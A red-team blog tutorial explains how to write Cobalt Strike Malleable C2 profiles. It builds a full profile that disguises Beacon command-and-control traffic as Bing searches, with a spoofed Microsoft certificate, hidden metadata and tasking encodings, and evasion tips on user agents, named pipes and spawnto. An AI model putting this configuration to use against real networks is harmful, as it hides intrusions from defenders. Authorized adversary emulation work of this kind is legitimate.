---
layout: post
title: How to Write Malleable C2 Profiles for Cobalt Strike
summary: How to create Malleable C2 profiles to shape your Cobalt Strike C2 traffic. 
tags: 
- cobalt strike
- malleable c2
featuredimage: /assets/malleable_c2/wireshark_2.png
---

It's not fun to get caught on an assessment because your target has your toolset signatured. It's even less fun if that signature is easily bypassed. Cobalt Strike's Malleable C2 is a method of avoiding that problem when it comes to command and control (C2) traffic. Malleable C2 provides operators with a method to mold Cobalt Strike command and control traffic to their will. For instance, if you determine your target organization allows employees to use Pandora, you could create a [profile](https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/pandora.profile) to make Cobalt Strike's C2 traffic look like Pandora on the wire. Alternatively, if a client wants to test detection capabilities, you could make your traffic look like a well-known malware toolkit like [Zeus](https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/crimeware/zeus.profile).

Raphael Mudge ([@armitagehacker](https://twitter.com/armitagehacker)) previously covered Malleable C2 in the official Cobalt Strike documentation as well as on his blog:

* [Malleable C2 Profiles - GitHub](https://github.com/rsmudge/Malleable-C2-Profiles)
* [Malleable Command and Control Documentation - cobaltstrike.com](https://www.cobaltstrike.com/help-malleable-c2)
* [Cobalt Strike 2.0 - Malleable Command and Control](http://blog.cobaltstrike.com/2014/07/16/malleable-command-and-control/)
* [Cobalt Strike 3.6 - A Path for Privilege Escalation](http://blog.cobaltstrike.com/2016/12/08/cobalt-strike-3-6-a-path-for-privilege-escalation/)

Will Schroeder ([@harmj0y](https://twitter.com/harmj0y)) also covered Malleable C2 in his post [A Brave New World: Malleable C2](http://www.harmj0y.net/blog/redteaming/a-brave-new-world-malleable-c2/). A big thanks to both Raphael and Will for their previous work!

This post covers how to create new Malleable C2 profiles for Cobalt Strike, using Bing web search as an example. The aim of the post is not to cover every option Malleable C2 provides (that's what documentation is for!); rather, the goal is to provide a workflow for traffic selection and profile creation. A GitHub repo with the Bing web search and my other profiles can be found [here](https://github.com/bluscreenofjeff/MalleableC2Profiles). 

# Choosing a Target Profile
Consider your target environment when deciding on the website or application we want to emulate. Ideally, our Cobalt Strike C2 traffic will blend in with normal traffic on the target network. If a network defender does end up reviewing our traffic, we want to maximize the chances of being dismissed as legitimate.

In a highly-targeted test, this may mean creating individual profiles per targeted department. For instance, if our target is the loan processing department at a financial institution, a digital document signing service (like Docusign) would likely blend in. Enumerate specific applications using open source intelligence gathering techniques where possible.

# Creating the Profile

Each profile contains the following elements:

* global options
* https-certificate (optional)
* http-get
	* client
		* metadata
	* server
		* output
* http-post
	* client
		* id
		* output
	* server
		* output
* http-stager

This may seem like a lot to fill out per profile, but it is manageable and provides extensive customization options. 

Before we go further, it's useful to understand the basics about how Beacon communicates. After Beacon stages, it sends a GET request to the server with host metadata. This is controlled by the *http-get* client portion of the profile. Beacon will thereafter check-in at the designated sleep interval. If the teamserver has taskings for the Beacon, it will provide them in the response to the next check-in request. The teamserver response is controlled by the *http-get* server portion of the profile. 

When Beacon has output from a tasking, it will send the data back to the teamserver via a POST request (as configured by the *http-server* client portion of the profile.) 

![Beacon transaction](/assets/malleable_c2/beacon_transaction.png) 

Beginning in Cobalt Strike version 3.6, it is possible to change the HTTP verb from POST to GET. The response to this POST request, *http-post* server in the profile, is disregarded by Beacon. By default, Beacon uses an HTTP POST request for steps #3 and #4 above. Depending on your target environment or the traffic you’re emulating, alternating GET and POST requests may get noticed. In those cases, set the *http-post* section’s verb to GET.

## Traffic Capture

Now that we know the information needed to complete the profile, we need to capture legitimate Bing traffic. There are two primary collection methods: Wireshark/tcpdump and Burp Suite. Either can be used, but each have their strengths. Use whichever method you are most comfortable with.

Wireshark is generally easier to use than Burp Suite and captures more data, but its filtering capabilities have a steeper learning curve. 

Burp Suite is easier to use than Wireshark/tcpdump when capturing HTTPS traffic or evaluating a complex traffic source. Burp's Repeater tool is useful in determining what HTTP headers or cookies change from session to session. To export requests from the HTTP History tab, highlight the request(s), right click, and select save items. *Be sure to uncheck the "Base64 requests" checkbox!* This outputs an XML file containing all the information available in the GUI. 

Once the capture is complete, review the file for URIs that look "normal" and have highly customizable headers or parameters. In the case of Bing web search, the following URI looks good:

![Wireshark packet capture](/assets/malleable_c2/wireshark_1.png)

Here's the request and response:

![Wireshark packet capture](/assets/malleable_c2/wireshark_2.png)

<div style="background-color:whitesmoke;color:rgb(167,44,52);font-size:.85em;overflow-x:scroll;white-space: nowrap;padding:6px;">
<span style="background-color: rgb(251,237,237);">GET /search?q=canary&qs=n&form=QBLH&sp=-1&pq=canary&sc=8-6&sk=&cvid=8148A7693CA44EFB87702930A3122933 HTTP/1.1<br>
Host: www.bing.com<br>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:42.0) Gecko/20100101 Firefox/42.0<br>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br>
Accept-Language: en-US,en;q=0.5<br>
Accept-Encoding: gzip, deflate<br>
Referer: http://www.bing.com/<br>
Cookie: DUP=Q=GpO1nJpMnam4UllEfmeMdg2&T=283766828&A=1&IG=C5F7F5AD88C443A0800032D5B0392C4B; SRCHD=AF=NOFORM; SRCHUID=V=2&GUID=0A3EA7220EAF42DA9494F932DDD25D52; SRCHUSR=DOB=20161228; _SS=SID=3D34D4B7AFA76BB5299ADD4EAE746ABE&HV=1482912680&R=50&bIm=02:89:; _EDGE_S=mkt=en-us&F=1&SID=3D34D4B7AFA76BB5299ADD4EAE746ABE; _EDGE_V=1; MUID=024D7DA4A7BA6CFE12AA745DA6696DF7; MUIDB=024D7DA4A7BA6CFE12AA745DA6696DF7; SRCHHPGUSR=CW=762&CH=547&DPR=1&UTC=-300; _RwBf=s=70&o=16; WLS=TS=63618509479; ipv6=hit=1<br>
Connection: keep-alive</span></div>

<div style="background-color:whitesmoke;color:rgb(41,9,159);font-size:.85em;overflow-x:scroll;white-space: nowrap;padding:6px;">
<span style="background-color: rgb(237,237,251);">HTTP/1.1 200 OK<br>
Cache-Control: private, max-age=0<br>
Transfer-Encoding: chunked<br>
Content-Type: text/html; charset=utf-8<br>
Content-Encoding: gzip<br>
Expires: Wed, 28 Dec 2016 08:10:28 GMT<br>
Vary: Accept-Encoding<br>
Server: Microsoft-IIS/8.5<br>
P3P: CP="NON UNI COM NAV STA LOC CURa DEVa PSAa PSDa OUR IND"<br>
Set-Cookie: DUP=Q=GpO1nJpMnam4UllEfmeMdg2&T=283767088&A=1&IG=B0C5A36E5E554114BCD97FC0D8413045; domain=.bing.com; path=/search<br>
X-MSEdge-Ref: Ref A: E0954F7D860D4530B9E99E7FA8622086 Ref B: 9D5A99D88B2DBFBD59EEA19DF8121265 Ref C: Wed Dec 28 00:11:29 2016 PST<br>
Date: Wed, 28 Dec 2016 08:11:29 GMT<br>
<br>
d9e<br>
....1.cX...Zms.....3..\fn..P.%....c.N.w.l. <--Snipped--></span></div>

## HTTPS Certificate

For our new profile, we'll first configure the HTTPS certificate. Filling in the HTTPS certificate is usually straight forward: load the target domain in a browser and copy the details from the legitimate certificate. Unfortunately, some websites just do not have an SSL certificate. In those cases, the target's parent company may have a certificate from which you can take details. Otherwise, guesswork will be required.

One quirk I've encountered is that *c2lint* (the Malleable C2 profile testing tool -- more on that later) may fail if you use punctuation in any of the fields. If your certificate isn't generating properly, try removing the punctuation.

Malleable C2 also supports using valid SSL certificates by placing the keystore in the same directory where the profile is located and configuring the following options (lifted from the documentation):

```plaintext
https-certificate {
	set keystore "domain.store";
	set password "mypassword";
}
```

There are step-by-step instructions for how to do this in the [Valid SSL Certificates with SSL Beacon](https://www.cobaltstrike.com/help-malleable-c2#validssl) section of the official documentation.

Here is the syntax to configure up our Bing certificate in the profile:

```plaintext
https-certificate {
    set CN       "www.bing.com";
    set O        "Microsoft Corporation";
    set C        "US";
    set L        "Redmond";
    set OU       "Microsoft IT";
    set ST       "WA";
    set validity "365";
}
```

## Global Options

Malleable C2 profiles can be configured with a number of global options to shape the traffic and Beacon's behavior. A full list is available in the official documentation. At a minimum, the *sleeptime*, *jitter*, and *useragent* options should be set.

Here is the syntax to set some global options in our Bing profile:

```plaintext
set sleeptime "60000";
set jitter    "20";
set useragent "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
set dns_idle "8.8.4.4";
set maxdns    "235";
```

The *sleeptime* setting is used to configure how frequently, in milliseconds, Beacons will check-in by default. *Jitter* is used to vary the check-in interval by the specified percentage; it accepts values 0 - 99. For instance, in our Bing profile, Beacons will check in anywhere between 48 and 72 seconds. Increasing the check-in jitter can decrease the chance of detection by some security monitoring solutions and just generally makes our traffic blend in better.

*useragent* configures the user agent strings that will be used for HTTP traffic. A list of common user agents is available [here](http://www.useragentstring.com/pages/useragentstring.php). If you can gather an actual user agent being used by a host in the target organization, you should use that instead. Advanced organizations often monitor their environment for irregular user agent strings- most companies only have a few legitimate strings in use.

The *dns_idle* option is used to signal to DNS beacons that no tasks are queued up. We can set any IP, but Google DNS servers are widely used by hosts for DNS so we'll use that. Again, this is a good candidate for customization to your target's DNS server.

*maxdns* configures the maximum hostname length used by Cobalt Strike when uploading data. The default value is 255, which may flag on some security appliances. Keep in mind that the lower this setting is configured, the more DNS traffic is likely to be generated. Either way the target will see a spike in DNS traffic overall, but it's important to keep in mind when changing this setting to a low value.

Two useful global options we didn't set are *pipename* and *spawnto*. *pipename* sets the pipe name used in Beacon's [SMB C2 traffic](https://www.cobaltstrike.com/help-smb-beacon). We will want to configure this setting if there's reason to believe the target will be forensically reviewing named pipes if we're detected. To determine what pipe names may blend in, we can use the sysinternals tool `handle.exe`:

```plaintext
sysinternals: handle.exe -a | findstr /i namedpipe
```

*spawnto* is actually two settings, *spawnto_x86* and *spawnto_x64*, that change the program Cobalt Strike opens and injects shellcode into. In other words: any time Cobalt Strike starts a new Beacon process, the process will be the one designated by *spawnto*. The default program is `rundll32.exe`.

It's helpful to configure the *pipename* and *spawnto* settings to complement each other by tying the names to similar process or service names. Here is a list of [well-known MSRPC named pipes](http://www.hsc.fr/ressources/articles/win_net_srv/well_known_named_pipes.html) to get started. If your target is sophisticated and likely to be actively hunting you in the network, it may be prudent to pull a list of named pipes from a host and modify your Malleable C2 profile to use named pipes that are actively in use on the network.

Big thanks to Lee Christensen ([@tifkin_](https://twitter.com/tifkin_)) for the above command and his help with named pipes!

## HTTP-GET

In the *http-get* section of our profile, we need to configure how Beacon checks in with Cobalt Strike and how Beacon receives its taskings.

I recommend reading the *Profile Language* and *Data Transform Language* sections of the [Cobalt Strike documentation](https://www.cobaltstrike.com/help-malleable-c2) before going through the rest of your profile, as this post doesn't cover every available option.

Working off the real request and response, we can fill in the URI, headers, parameters, and output formatting: 

```plaintext
http-get {

    set uri "/search/";

    client {

        header "Host" "www.bing.com";
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Cookie" "DUP=Q=GpO1nJpMnam4UllEfmeMdg2&T=283767088&A=1&IG"; 
        
        metadata {
            base64url;
            parameter "q";
        }

        parameter "go" "Search";
        parameter "qs" "bs";
        parameter "form" "QBRE";


    }

    server {

        header "Cache-Control" "private, max-age=0";
        header "Content-Type" "text/html; charset=utf-8";
        header "Vary" "Accept-Encoding";
        header "Server" "Microsoft-IIS/8.5";
        header "Connection" "close";
        

        output {
            netbios;
            prepend "<!DOCTYPE html><html lang=\"en\" xml:lang=\"en\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:Web=\"http://schemas.live.com/Web/\"><script type=\"text/javascript\">//<![CDATA[si_ST=new Date;//]]></script><head><!--pc--><title>Bing</title><meta content=\"text/html; charset=utf-8\" http-equiv=\"content-type\" /><link href=\"/search?format=rss&amp;q=canary&amp;go=Search&amp;qs=bs&amp;form=QBRE\" rel=\"alternate\" title=\"XML\" type=\"text/xml\" /><link href=\"/search?format=rss&amp;q=canary&amp;go=Search&amp;qs=bs&amp;form=QBRE\" rel=\"alternate\" title=\"RSS\" type=\"application/rss+xml\" /><link href=\"/sa/simg/bing_p_rr_teal_min.ico\" rel=\"shortcut icon\" /><script type=\"text/javascript\">//<![CDATA[";
            append "G={ST:(si_ST?si_ST:new Date),Mkt:\"en-US\",RTL:false,Ver:\"53\",IG:\"4C1158CCBAFC4896AD78ED0FF0F4A1B2\",EventID:\"E37FA2E804B54C71B3E275E9589590F8\",MN:\"SERP\",V:\"web\",P:\"SERP\",DA:\"CO4\",SUIH:\"OBJhNcrOC72Z3mr21coFQw\",gpUrl:\"/fd/ls/GLinkPing.aspx?\" }; _G.lsUrl=\"/fd/ls/l?IG=\"+_G.IG ;curUrl=\"http://www.bing.com/search\";function si_T(a){ if(document.images){_G.GPImg=new Image;_G.GPImg.src=_G.gpUrl+\"IG=\"+_G.IG+\"&\"+a;}return true;};//]]></script><style type=\"text/css\">.sw_ddbk:after,.sw_ddw:after,.sw_ddgn:after,.sw_poi:after,.sw_poia:after,.sw_play:after,.sw_playa:after,.sw_playd:after,.sw_playp:after,.sw_st:after,.sw_sth:after,.sw_ste:after,.sw_st2:after,.sw_plus:after,.sw_tpcg:after,.sw_tpcw:after,.sw_tpcbk:after,.sw_arwh:after,.sb_pagN:after,.sb_pagP:after,.sw_up:after,.sw_down:after,.b_expandToggle:after,.sw_calc:after,.sw_fbi:after,";
            print;
        }
    }
}
```
The URI option is straight-forward, we assign the base URI from the real request. Interestingly, we can specify multiple URIs for the profile with a space-delimited list of URIs. Cobalt Strike will randomly assign a URI to each host when it checks in. **No URIs can be duplicated between *http-get* and *http-post*; all URIs must be unique**. We *can*, however, simply change casing on one letter to make the URI unique. We have done this in the Bing web search profile to make the GET and POST URIs unique.

Headers and parameters are added next following the `header "key" "value";` or `parameter "key" "value";` syntax. Looking at the final profile, you might notice that we omitted a number of headers and URL parameters from the real request. The compiled http-get client request size must be less than 252 bytes to be considered stable. We want to pick the most important headers and parameters to make our requests blend in with real traffic. Unfortunately this sometimes mean that we have to trim down some data sections.

The key piece of data Beacon needs to send to Cobalt Strike in the client section is the host metadata. We can place the metadata in a header, parameter, URI, or request body. If we place the information in a header, parameter, or URI, we need to encode the data. Malleable C2 offers four data encoding types: base64, base64url, netbios, and netbiosu (uppercase).

Here's some sample output from each encoding type:

```plaintext
#base64
nqveOtUC+NlNAyHPVkSLMA==

#base64url
hf2D_5jHAA9ftoOe_ZY3zQ

#netbios
haklhhicanfeldpmgkefkhgjmhccgbmp

#netbiosu 
HHHHGLGDJDELLEKFMDKAANJCLHIEFEMC
```

In addition to the encoding, we can also prepend or append strings to the information. Cobalt Strike interprets the commands from top to bottom and processes on the termination statement (where we specify where to place the information). The four termination statements are: *print*, *header*, *parameter*, and *uri-append*.

For instance, in the server portion of this section we configure the response to encode the Beacon taskings with netbios and insert it within a long HTML string pulled from the real response. We make the encoded tasking simply look like a value in the Bing search results. The *http-get* server output **must** use the *print* termination statement.


## HTTP-POST

In the *http-post* section of our profile, we configure how Beacon sends output to Cobalt Strike. For the Bing web search profile, we want to make the traffic look as close to the *http-get* section as possible.

```plaintext
http-post {
    
    set uri "/Search/";
    set verb "GET";

    client {

        header "Host" "www.bing.com";
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Cookie" "DUP=Q=GpO1nJpMnam4UllEfmeMdg2&T=283767088&A=1&IG"; 
        
        output {
            base64url;
            parameter "q";
        }
        
        parameter "go" "Search";
        parameter "qs" "bs";
        
        id {
            base64url;
            parameter "form";
        }
    }

    server {

        header "Cache-Control" "private, max-age=0";
        header "Content-Type" "text/html; charset=utf-8";
        header "Vary" "Accept-Encoding";
        header "Server" "Microsoft-IIS/8.5";
        header "Connection" "close";
        

        output {
            netbios;
            prepend "<!DOCTYPE html><html lang=\"en\" xml:lang=\"en\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:Web=\"http://schemas.live.com/Web/\"><script type=\"text/javascript\">//<![CDATA[si_ST=new Date;//]]></script><head><!--pc--><title>Bing</title><meta content=\"text/html; charset=utf-8\" http-equiv=\"content-type\" /><link href=\"/search?format=rss&amp;q=canary&amp;go=Search&amp;qs=bs&amp;form=QBRE\" rel=\"alternate\" title=\"XML\" type=\"text/xml\" /><link href=\"/search?format=rss&amp;q=canary&amp;go=Search&amp;qs=bs&amp;form=QBRE\" rel=\"alternate\" title=\"RSS\" type=\"application/rss+xml\" /><link href=\"/sa/simg/bing_p_rr_teal_min.ico\" rel=\"shortcut icon\" /><script type=\"text/javascript\">//<![CDATA[";
            append "G={ST:(si_ST?si_ST:new Date),Mkt:\"en-US\",RTL:false,Ver:\"53\",IG:\"4C1158CCBAFC4896AD78ED0FF0F4A1B2\",EventID:\"E37FA2E804B54C71B3E275E9589590F8\",MN:\"SERP\",V:\"web\",P:\"SERP\",DA:\"CO4\",SUIH:\"OBJhNcrOC72Z3mr21coFQw\",gpUrl:\"/fd/ls/GLinkPing.aspx?\" }; _G.lsUrl=\"/fd/ls/l?IG=\"+_G.IG ;curUrl=\"http://www.bing.com/search\";function si_T(a){ if(document.images){_G.GPImg=new Image;_G.GPImg.src=_G.gpUrl+\"IG=\"+_G.IG+\"&\"+a;}return true;};//]]></script><style type=\"text/css\">.sw_ddbk:after,.sw_ddw:after,.sw_ddgn:after,.sw_poi:after,.sw_poia:after,.sw_play:after,.sw_playa:after,.sw_playd:after,.sw_playp:after,.sw_st:after,.sw_sth:after,.sw_ste:after,.sw_st2:after,.sw_plus:after,.sw_tpcg:after,.sw_tpcw:after,.sw_tpcbk:after,.sw_arwh:after,.sb_pagN:after,.sb_pagP:after,.sw_up:after,.sw_down:after,.b_expandToggle:after,.sw_calc:after,.sw_fbi:after,";
            print;
        }
    }
}
```

There are a few key changes we need to make for the *http-post* client section. First, we need to make the URI distinct from the *http-get* URI by making "Search" start with a capital letter. We also change the HTTP verb to GET, as opposed to the default POST. In this section we have two pieces of information Beacon must return to the Cobalt Strike server: the session ID and task output. We place the *base64url*-encoded task output in the *q* URL parameter, where we configured *http-get* to send host metadata. The session ID we send in the *form* URL parameter, which was previously a static value.

In the server portion, we mirror the *http-get* options for traffic consistency. Beacon will ultimately disregard this traffic, but it will keep the traffic looking as normal as possible. The *http-post* server output **must** use the *print* termination statement.

## HTTP-Stager

The last portion of the profile is the *http-stager*, where we configure headers for Cobalt Strike to use during the staging process. For the Bing web search profile we will mirror our previous server headers:

```plaintext
http-stager {
    server {
        header "Cache-Control" "private, max-age=0";
        header "Content-Type" "text/html; charset=utf-8";
        header "Vary" "Accept-Encoding";
        header "Server" "Microsoft-IIS/8.5";
        header "Connection" "close";
    }
}
```

# Testing and Usage

Making profiles requires a lot of trial and error. Luckily, we have a tool to make things easier: *c2lint*. *c2lint* performs unit testing on the profile to test compiling and SSL certificate generation. It also generates fake traffic to ensure the requests and responses conform to networking standards. 

To run *c2lint*, cd to your Cobalt Strike directory and run:

```plaintext
./c2lint /path/to/malleable_c2_profile.profile
```

As an aside, if you can't figure out what's causing *c2lint* to fail - check to be sure all lines end with a semicolon. Another stumbling block is the use of special characters, like quotes and semicolons. Special characters must be escaped if they appear in a value in the profile. 

If possible, run the Cobalt Strike traffic through a security appliance or [Security Onion](https://securityonion.net/) to ensure your traffic is flagged as your target traffic. At a minimum, you can ensure your traffic isn't flagged as suspicious and gain a deeper understanding of how the Blue Team will see your traffic.

If a testing with a security appliance isn't feasible, try capturing Cobalt Strike traffic and reviewing it in Wireshark. Here are screenshots of the Bing web search profile staging, checking in, being tasked to retrieve a process list, and sending the output back:

![Bing web search profile packet capture](/assets/malleable_c2/bing_web_search_profile__staging.png) 

![Bing web search profile packet capture](/assets/malleable_c2/bing_web_search_http-get__staging.png) 

![Bing web search profile packet capture](/assets/malleable_c2/bing_web_search_http-post__staging.png) 


# Summary

Malleable C2 provides testers with immense customization options over Cobalt Strike command and control traffic. From emulating a known adversary to evading the Blue Team, Malleable C2 can strengthen any Cobalt Strike user's assessment. Creating profiles may be overwhelming at first, but profile creation will quickly become second nature. Given the power of Malleable C2 and relatively low resource required to implement a custom profile, why not roll a custom profile on your assessments?

# Resources

* [Malleable C2 Cobalt Strike Documentation](https://www.cobaltstrike.com/help-malleable-c2)
* [Cobalt Strike 2.0 - Malleable Command and Control](http://blog.cobaltstrike.com/2014/07/16/malleable-command-and-control/)
* [A Brave New World: Malleable C2 - harmj0y](http://www.harmj0y.net/blog/redteaming/a-brave-new-world-malleable-c2/) 
* [Cobalt Strike 3.6 - A Path for Privilege Escalation](http://blog.cobaltstrike.com/2016/12/08/cobalt-strike-3-6-a-path-for-privilege-escalation/) - details the GET-only functionality of Malleable C2